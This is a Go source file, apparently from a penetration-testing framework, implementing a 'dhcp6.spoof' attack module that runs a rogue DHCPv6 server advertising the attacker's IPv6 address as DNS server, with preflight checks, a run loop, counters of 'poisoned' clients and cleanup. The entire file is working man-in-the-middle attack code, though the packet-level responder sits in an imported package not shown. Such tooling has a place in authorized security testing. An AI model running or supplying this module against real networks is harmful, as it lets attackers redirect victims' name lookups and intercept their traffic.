package mitm

import (
	"fmt"
	"net"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/netx/dhcp6"
	"github.com/qyvora/toha3ee/internal/safety"
)

func init() {
	attacks.Register(&DHCP6Spoof{})
}

// DHCP6Spoof advertises a rogue DNS server to IPv6 clients.
type DHCP6Spoof struct{}

// Meta implements attacks.Module.
func (*DHCP6Spoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "dhcp6.spoof",
		Category:    "mitm",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Requires:    []string{"cap.ipv6"},
		Description: "rogue DHCPv6 server advertising this host's IPv6 as the DNS server",
		Limitations: "only affects networks with IPv6 and clients that accept DHCPv6-provided DNS; requires an attacker IPv6 address",
	}
}

// Preflight requires an IPv6 address.
func (*DHCP6Spoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	if ctx.Iface.IPv6 == nil {
		rep.AddBlocked("ipv6", "interface has no IPv6 address; DHCPv6 DNS poisoning impossible")
	} else {
		rep.AddOK("ipv6", ctx.Iface.IPv6.String())
	}
	rep.AddFixable("mitm", "run arp.spoof (or IPv6 equivalents) so clients resolve names through this host")
	return rep, nil
}

// Run starts the responder.
func (*DHCP6Spoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	if ctx.Iface.IPv6 == nil {
		return fmt.Errorf("dhcp6.spoof: no IPv6 address on %s", ctx.Iface.Name)
	}
	iface, err := net.InterfaceByName(ctx.Iface.Name)
	if err != nil {
		return fmt.Errorf("dhcp6.spoof: %w", err)
	}
	r := dhcp6.New(iface, ctx.Iface.IPv6, ctx.Bus)
	if err := r.Start(); err != nil {
		return fmt.Errorf("dhcp6.spoof: %w", err)
	}
	ctx.SetState("dhcp6.spoof", r)
	ctx.Safety.RegisterCleanup("dhcp6.spoof", "stop DHCPv6 responder", func() error {
		r.Stop()
		return nil
	})
	ctx.Printf("[*] dhcp6.spoof advertising DNS %s to IPv6 clients.\n", ctx.Iface.IPv6)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("dhcp6.spoof", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports counters.
func (*DHCP6Spoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("dhcp6.spoof")
	if !ok {
		return nil, fmt.Errorf("dhcp6.spoof not running")
	}
	r := v.(*dhcp6.Responder)
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("answered %d DHCPv6 query(ies)", r.Poisoned.Load()),
	}
	imp.Add("poisoned", fmt.Sprintf("%d", r.Poisoned.Load()))
	imp.Add("queries", fmt.Sprintf("%d", r.Queries.Load()))
	return imp, nil
}

// Cleanup stops the responder.
func (*DHCP6Spoof) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("dhcp6.spoof")
	ctx.Safety.UnregisterCleanup("dhcp6.spoof")
	if v, ok := ctx.GetState("dhcp6.spoof"); ok {
		v.(*dhcp6.Responder).Stop()
	}
	return nil
}

var _ attacks.Module = (*DHCP6Spoof)(nil)
